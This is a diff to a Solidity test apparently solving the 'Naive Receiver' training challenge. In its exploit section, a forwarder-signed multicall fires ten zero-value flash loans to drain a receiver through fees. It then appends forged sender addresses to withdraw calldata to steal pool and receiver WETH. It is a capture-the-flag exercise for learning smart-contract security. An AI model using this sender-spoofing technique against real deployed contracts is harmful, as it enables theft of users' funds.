@@ -23,17 +23,21 @@ contract NaiveReceiver is Test {
 
     address payable internal user;
     address payable internal attacker;
+    uint256 internal attackerPk;
 
     address internal recovery;
 
     function setUp() public {
         utils = new Utilities();
-        address payable[] memory users = utils.createUsers(2);
+        address payable[] memory users = utils.createUsers(1);
         user = users[0];
-        attacker = users[1];
+
+        (address _attacker, uint256 _attackerPk) = makeAddrAndKey("Attacker");
+        attacker = payable(_attacker);
+        attackerPk = _attackerPk;
 
         vm.label(user, "User");
-        vm.label(attacker, "Attacker");
+        // vm.label(attacker) is already done by makeAddrAndKey
 
         forwarder = new BasicForwarder();
         weth = new WETH();
@@ -66,25 +70,21 @@ contract NaiveReceiver is Test {
          * EXPLOIT START *
          */
 
-        vm.startPrank(attacker);
-        for (uint256 i = 0; i < 10; i++) {
-            pool.flashLoan(flashLoanReceiver, address(weth), 0, "");
-        }
-
         address admin = pool.feeReceiver(); // store the address of the the feeReceiver
-        bytes[] memory data = new bytes[](11); // 10 calls to pool.flashLoan + 1 call to pool.withdraw
+        bytes[] memory data = new bytes[](12); // 10 calls to pool.flashLoan + 2 calls to pool.withdraw
 
         // Build the data for the 10 calls to pool.flashLoan
         for (uint256 i = 0; i < 10; i++) {
             data[i] = abi.encodeCall(pool.flashLoan, (flashLoanReceiver, address(weth), 0, ""));
         }
 
-        // Build the data for the 1 call to pool.withdraw, append the admin address to the data
-        data[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (WETH_IN_POOL, recovery)), admin);
+        // Build the data for the 2 calls to pool.withdraw, append the fake senders to the data
+        data[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (WETH_IN_RECEIVER, payable(recovery))), admin);
+        data[11] = abi.encodePacked(abi.encodeCall(pool.withdraw, (WETH_IN_POOL, payable(recovery))), address(this));
 
         bytes memory payload = abi.encodeCall(pool.multicall, data);
 
-        Request request = Request({
+        BasicForwarder.Request memory request = BasicForwarder.Request({
             from: attacker,
             target: address(pool),
             value: 0,
@@ -97,7 +97,7 @@ contract NaiveReceiver is Test {
         bytes32 digest =
             keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
 
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attacker, digest);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
         bytes memory signature = abi.encodePacked(r, s, v);
 
         forwarder.execute(request, signature);
